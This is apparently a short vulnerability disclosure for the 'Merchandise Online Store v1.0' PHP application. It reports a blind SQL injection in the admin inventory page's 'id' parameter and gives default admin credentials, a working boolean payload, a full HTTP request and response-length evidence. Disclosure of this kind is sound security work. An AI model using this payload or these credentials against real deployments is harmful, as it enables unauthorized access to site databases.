# Merchandise Online Store v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/14887/merchandise-online-store-php-free-source-code.html

Vulnerability File: /vloggers_merch/admin/?page=inventory/manage_inventory&id=

Vulnerability location: /vloggers_merch/admin/?page=inventory/manage_inventory&id=,id

[+] Payload: /vloggers_merch/admin/?page=inventory/manage_inventory&id=5%27%20and%20length(database())%20=17--+ // Leak place ---> id

Current database name: vloggers_merch_db,length is 17

```sql
GET /vloggers_merch/admin/?page=inventory/manage_inventory&id=5%27%20and%20length(database())%20=17--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=n23o4bgngdq5q3js6l0a0i6r6k
Connection: close
```

When length (database ()) = 16, Content-Length: 26978

![image](https://user-images.githubusercontent.com/54017627/166880997-26d91117-8932-4bfe-bd53-f5f853f32e2d.png)

![image](https://user-images.githubusercontent.com/54017627/166881083-a6c28dc7-9d19-44aa-a8aa-cdaea1fb6e07.png)

When length (database ()) = 17, Content-Length: 26988

![image](https://user-images.githubusercontent.com/54017627/166880946-3e8606bb-49a7-44c7-a778-379f70e8dc65.png)

![image](https://user-images.githubusercontent.com/54017627/166881043-8ba0d059-08b2-4bda-87b9-579c01d17cdc.png)
